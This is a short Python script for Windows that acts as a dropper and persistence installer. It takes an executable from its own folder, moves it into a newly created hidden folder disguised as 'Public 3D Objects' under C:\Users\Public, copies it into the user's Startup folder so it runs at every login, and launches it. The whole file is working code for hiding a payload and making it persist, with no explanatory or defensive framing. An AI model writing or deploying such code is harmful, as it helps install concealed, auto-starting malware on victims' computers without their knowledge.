import shutil
import getpass
import os
import ctypes

current_file_path = os.path.abspath(__file__)

current_folder = os.path.dirname(current_file_path)

all_files = os.listdir(current_folder)

setup_exe_name = None
for file in all_files:
    if file.endswith(".exe") and file != os.path.basename(__file__):
        setup_exe_name = file
        break
    
if not os.path.exists("C:\\Users\\Public\\Public 3D Objects"):
	os.mkdir("C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

shutil.move(setup_exe_name, r"C:\Users\Public\Public 3D Objects\\")

USER_NAME = getpass.getuser()
path_to_file = r"C:\Users\Public\Public 3D Objects\\" + setup_exe_name
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
shutil.copy(path_to_file, bat_path)

os.startfile(r"C:\Users\Public\Public 3D Objects\\" + setup_exe_name)